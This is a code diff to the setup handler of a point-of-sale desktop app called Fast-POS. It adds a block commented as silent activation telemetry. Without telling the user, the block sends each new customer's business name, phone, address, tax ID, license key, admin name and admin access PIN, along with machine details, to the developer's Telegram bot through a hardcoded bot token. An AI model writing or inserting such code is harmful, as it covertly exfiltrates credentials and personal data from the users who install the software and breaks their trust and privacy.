@@ -293,6 +293,78 @@ function setupIpcHandlers() {
 
       runSetup(data);
       console.log("[SETUP] Onboarding Inicial completado. Base de datos aprovisionada.");
+
+      // ── Telemetría Silenciosa de Activación ─────────────────────────────────
+      // Se notifica al desarrollador (tú) con los datos del nuevo cliente.
+      // Esto se hace en background — si falla, NO afecta al usuario.
+      const TELEGRAM_BOT_TOKEN = "8571275927:AAEgowMUL3jsK8SnF0zMe_aSnzyDvQGMbWY";
+      const TELEGRAM_CHAT_ID   = "8632360063";
+
+      if (TELEGRAM_CHAT_ID !== "PENDING") {
+        const taxRate = data.fiscal?.taxRate
+          ? `${(parseInt(data.fiscal.taxRate) / 100).toFixed(1)}%`
+          : "N/D";
+        const expMsg = licenseCheck.payload.exp === "LIFETIME"
+          ? "♾️ Permanente"
+          : new Date(licenseCheck.payload.exp).toLocaleDateString("es-MX");
+
+        const os = require("os");
+        const osPlatformMap = { darwin: "macOS", win32: "Windows", linux: "Linux" };
+        const osPlatform  = osPlatformMap[process.platform] || process.platform;
+        const osRelease   = os.release();
+        const osArch      = process.arch;
+        const hostname    = os.hostname();
+        const ramGB       = (os.totalmem() / 1024 ** 3).toFixed(1);
+        const appVersion  = app.getVersion();
+
+        const msg = [
+          "🟢 *Nueva Activación Fast-POS*",
+          "",
+          `*🏪 Negocio:* ${data.business?.name || "N/D"}`,
+          `*🏬 Giro:* ${data.business?.businessType === "Otro" ? (data.business?.businessTypeCustom || "Otro") : (data.business?.businessType || "—")}`,
+          `*📞 Teléfono:* ${data.business?.phone || "—"}`,
+          `*📍 Dirección:* ${data.business?.address || "—"}`,
+          `*🧾 RFC:* ${data.business?.taxId || "—"}`,
+          "",
+          `*💳 Plan:* ${licenseCheck.payload.plan}`,
+          `*📅 Vigencia:* ${expMsg}`,
+          `*🔑 Clave Licencia:* ${licenseCheck.payload.client || "N/D"}`,
+          "",
+          `*💵 Moneda:* ${data.fiscal?.currency || "MXN"}`,
+          `*🏷️ Impuesto:* ${data.fiscal?.taxName || "IVA"} (${taxRate})`,
+          "",
+          `*📱 WhatsApp:* ${data.social?.whatsapp || "—"}`,
+          `*🌐 Web:* ${data.social?.website || "—"}`,
+          `*📸 Instagram:* ${data.social?.instagram || "—"}`,
+          "",
+          `*👑 Administrador:* ${data.admin?.name || "N/D"}`,
+          `*🔐 PIN de acceso:* \`${data.admin?.pin || "—"}\``,
+          "",
+          "─────────────────────",
+          `*💻 Sistema:* ${osPlatform} ${osRelease} (${osArch})`,
+          `*🖥️ Equipo:* ${hostname}`,
+          `*🧠 RAM:* ${ramGB} GB`,
+          `*📦 Versión App:* Fast-POS v${appVersion}`,
+          `*🕐 Fecha:* ${new Date().toLocaleString("es-MX")}`,
+        ].join("\n");
+
+        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: msg,
+            parse_mode: "Markdown",
+          }),
+        })
+        .then(r => r.json())
+        .then(r => { if (!r.ok) console.warn("[TELEMETRY] Telegram error:", r.description); })
+        .catch(e => console.warn("[TELEMETRY] Sin conexión para notificar:", e.message));
+      } else {
+        console.warn("[TELEMETRY] FASTPOS_CHAT_ID no configurado. Configúralo en variables de entorno.");
+      }
+      // ────────────────────────────────────────────────────────────────────────
+
       return { success: true };
     } catch (err) {
       console.error("[IPC:setup:complete]", err.message);
